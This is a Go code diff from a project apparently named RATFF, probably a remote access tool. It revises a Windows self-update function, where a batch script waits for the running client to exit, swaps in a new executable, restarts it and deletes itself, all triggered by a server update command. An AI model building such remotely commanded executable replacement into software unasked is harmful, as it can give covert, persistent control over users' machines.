@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 
 	"RATFF/shared"
@@ -109,14 +110,27 @@ func handleExecutableUpdate(clientID, tempPath, exePath string) shared.Message {
 // restartWithBatchScript handles Windows update using a batch script for delayed replacement.
 func restartWithBatchScript(clientID, tempPath, exePath string) shared.Message {
 	batPath := exePath + ".update.bat"
+	exeName := filepath.Base(exePath)
+	exeDir := filepath.Dir(exePath)
 
 	batContent := fmt.Sprintf(`@echo off
 timeout /t 2 /nobreak > nul
-del /f /q "%s"
+:waitloop
+tasklist /FI "IMAGENAME eq %s" 2>NUL | find /I /N "%s">NUL
+if "%%ERRORLEVEL%%"=="0" (
+    timeout /t 1 /nobreak > nul
+    goto waitloop
+)
 move /y "%s" "%s"
+if errorlevel 1 (
+    echo Failed to move new executable
+    exit /b 1
+)
+cd /d "%s"
 start "" "%s"
+timeout /t 1 /nobreak > nul
 del "%%~f0"
-`, exePath, tempPath, exePath, exePath)
+`, exeName, exeName, tempPath, exePath, exeDir, exePath)
 
 	if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
 		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
